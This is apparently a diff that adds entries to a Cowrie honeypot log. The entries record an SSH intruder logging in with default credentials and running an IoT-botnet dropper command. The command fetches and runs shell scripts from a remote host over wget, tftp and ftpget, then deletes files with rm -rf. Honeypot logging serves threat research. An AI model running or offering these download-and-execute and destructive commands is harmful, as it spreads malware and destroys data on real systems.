@@ -1352,3 +1352,48 @@
 2017-03-12T03:10:48+0000 [CowrieTelnetTransport,58052,221.157.167.88] Command found: cat /dev/shm/.s
 2017-03-12T03:10:49+0000 [CowrieTelnetTransport,58052,221.157.167.88] CMD: /bin/busybox ZGXNI
 2017-03-12T03:10:49+0000 [CowrieTelnetTransport,58052,221.157.167.88] Command found: /bin/busybox ZGXNI
+2017-03-12T03:11:48+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 46.166.185.67:42448 (10.8.41.81:2222) [session: 49f0c186]
+2017-03-12T03:11:48+0000 [HoneyPotSSHTransport,19460,46.166.185.67] Remote SSH version: SSH-2.0-libssh2_1.4.2
+2017-03-12T03:11:48+0000 [HoneyPotSSHTransport,19460,46.166.185.67] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-03-12T03:11:48+0000 [HoneyPotSSHTransport,19460,46.166.185.67] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-12T03:11:48+0000 [HoneyPotSSHTransport,19460,46.166.185.67] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-12T03:11:48+0000 [HoneyPotSSHTransport,19460,46.166.185.67] NEW KEYS
+2017-03-12T03:11:48+0000 [HoneyPotSSHTransport,19460,46.166.185.67] starting service 'ssh-userauth'
+2017-03-12T03:11:48+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,19460,46.166.185.67] 'admin' trying auth 'password'
+2017-03-12T03:11:48+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,19460,46.166.185.67] login attempt: 4
+2017-03-12T03:11:48+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,19460,46.166.185.67] login return, expect: [admin/1111]
+2017-03-12T03:11:49+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,19460,46.166.185.67] login attempt [admin/1111] succeeded
+2017-03-12T03:11:51+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,19460,46.166.185.67] 'admin' authenticated with 'password'
+2017-03-12T03:11:51+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,19460,46.166.185.67] starting service 'ssh-connection'
+2017-03-12T03:11:51+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,19460,46.166.185.67] got channel 'session' request
+2017-03-12T03:11:51+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,19460,46.166.185.67] channel open
+2017-03-12T03:11:51+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,19460,46.166.185.67] executing command "PAYLOAD cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.168.170.177/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 104.168.170.177 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 104.168.170.177; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.168.170.177 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"
+2017-03-12T03:11:51+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,19460,46.166.185.67] Opening TTY Log: log/tty/20170312-031151-49f0c186-0e.log
+2017-03-12T03:11:51+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,19460,46.166.185.67] CMD: PAYLOAD cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.168.170.177/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 104.168.170.177 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 104.168.170.177; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.168.170.177 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-03-12T03:11:51+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,19460,46.166.185.67] Command not found: PAYLOAD cd /tmp
+2017-03-12T03:11:51+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,19460,46.166.185.67] Command found: cd /var/run
+2017-03-12T03:11:51+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,19460,46.166.185.67] Command found: cd /mnt
+2017-03-12T03:11:51+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,19460,46.166.185.67] Command found: cd /root
+2017-03-12T03:11:51+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,19460,46.166.185.67] Command found: cd /
+2017-03-12T03:11:51+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,19460,46.166.185.67] Command found: wget http://104.168.170.177/bins.sh
+2017-03-12T03:11:51+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://104.168.170.177/bins.sh>
+2017-03-12T03:11:51+0000 [HTTPPageDownloader,client] Command found: chmod 777 bins.sh
+2017-03-12T03:11:51+0000 [HTTPPageDownloader,client] Command found: sh bins.sh
+2017-03-12T03:11:51+0000 [HTTPPageDownloader,client] Command found: tftp 104.168.170.177 -c get tftp1.sh
+2017-03-12T03:11:51+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-03-12T03:11:51+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-03-12T03:11:51+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 104.168.170.177
+2017-03-12T03:11:52+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-03-12T03:11:52+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-03-12T03:11:52+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 104.168.170.177 ftp1.sh ftp1.sh
+2017-03-12T03:11:52+0000 [HTTPPageDownloader,client] FTP connect failed: host=104.168.170.177, port=21, err=500 OOPS: failed to open vsftpd log file:/var/log/vsftpd.log
+2017-03-12T03:11:52+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-03-12T03:11:52+0000 [HTTPPageDownloader,client] Command found: rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh
+2017-03-12T03:11:52+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-03-12T03:11:52+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-03-12T03:11:52+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-03-12T03:11:52+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170312-031151-49f0c186-0e.log after 0 seconds
+2017-03-12T03:11:52+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-03-12T03:11:52+0000 [HTTPPageDownloader,client] sending close 0
+2017-03-12T03:11:52+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://104.168.170.177/bins.sh>
